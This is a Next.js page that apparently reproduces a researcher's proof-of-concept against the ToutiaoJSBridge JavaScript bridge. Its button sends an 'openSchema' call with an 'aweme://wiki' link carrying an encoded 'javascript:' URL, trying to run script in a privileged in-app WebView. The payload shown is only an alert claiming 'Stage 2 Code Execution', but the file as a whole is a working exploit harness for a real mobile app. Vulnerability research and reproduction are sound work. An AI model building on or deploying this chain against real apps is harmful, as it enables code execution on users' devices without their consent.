"use client"
import {useState, useEffect} from 'react';
import Head from 'next/head';

export default function Stage1TestPage() {
    const [isBridgeReady, setIsBridgeReady] = useState(false);

    // Check for the bridge on page load
    useEffect(() => {
        if (typeof window !== 'undefined' && window.ToutiaoJSBridge && typeof window.ToutiaoJSBridge.invokeMethod === 'function') {
            setIsBridgeReady(true);
        }
    }, []);

    const executeStage1 = () => {
        if (!isBridgeReady) {
            alert('Cannot execute: ToutiaoJSBridge not found.');
            return;
        }

        // --- The Stage 1 Payload ---
        // GOAL: Open the special 'AddWikiActivity' and execute a simple alert in its WebView.

        // We want the inner URL to be: javascript:alert('SUCCESS: Stage 2 Code Execution!')
        // This needs to be URL-encoded to be a valid parameter.
        const javascriptPayload = "javascript:alert('SUCCESS: Stage 2 Code Execution!')";
        const encodedJavascriptPayload = encodeURIComponent(javascriptPayload);

        // This is the full schema URL we are asking the bridge to open.
        const schemaUrl = `aweme://wiki?url=${encodedJavascriptPayload}&disable_app_link=false`;

        // This is the final JSON object for invokeMethod, matching the researcher's PoC.
        const payload = {
            "__callback_id": "0", // Using the hardcoded "0" from the PoC
            "func": "openSchema",
            "__msg_type": "callback",
            "params": {
                "schema": schemaUrl
            },
            "JSSDK": "1",
            "namespace": "host",
            "__iframe_url": "https://www.google.com/" // A neutral placeholder
        };

        try {
            // THE COMMAND
            window.ToutiaoJSBridge.invokeMethod(JSON.stringify(payload));
        } catch (e) {
            alert(`An error occurred while calling invokeMethod: ${e.message}`);
        }
    };

    return (
        <div>
            <Head>
                <title>Two-Stage Bridge Test</title>
            </Head>

            <main>
                <h1>
                    Bridge Vulnerability: Stage 1 Test
                </h1>

                <p>
                    This button attempts to use <code>openSchema</code> with an <code>aweme://wiki</code> link to
                    execute code in a new WebView context.
                </p>

                <div style={{margin: '2rem 0'}}>
                    <button
                        onClick={executeStage1}
                        disabled={!isBridgeReady}
                        style={{
                            padding: '20px 40px',
                            fontSize: '22px',
                            cursor: isBridgeReady ? 'pointer' : 'not-allowed',
                        }}
                    >
                        Execute Stage 1
                    </button>
                </div>

                <div style={{
                    marginTop: '1rem',
                    padding: '10px',
                    border: '1px solid #ddd',
                    borderRadius: '5px',
                    background: '#f8f9fa'
                }}>
                    <strong>Expected Outcome:</strong> If successful, a new screen or WebView may appear, and you should
                    see a system alert box that says "SUCCESS: Stage 2 Code Execution!".
                </div>
            </main>
        </div>
    );
}